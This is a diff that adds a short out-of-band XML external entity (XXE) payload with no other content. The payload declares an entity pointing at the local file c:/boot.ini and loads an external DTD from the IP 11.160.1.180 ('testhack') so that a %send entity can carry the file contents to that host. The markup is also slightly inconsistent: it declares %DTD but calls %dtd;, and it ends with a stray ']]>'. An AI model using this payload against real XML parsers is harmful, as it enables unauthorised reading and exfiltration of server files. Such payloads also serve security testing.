@@ -1,0 +1,6 @@
+<!DOCTYPE root [
+<!ENTITY % file SYSTEM "file:////c:/boot.ini">
+<!ENTITY % DTD SYSTEM "http://11.160.1.180/testhack">
+%dtd;
+%send;
+]]>
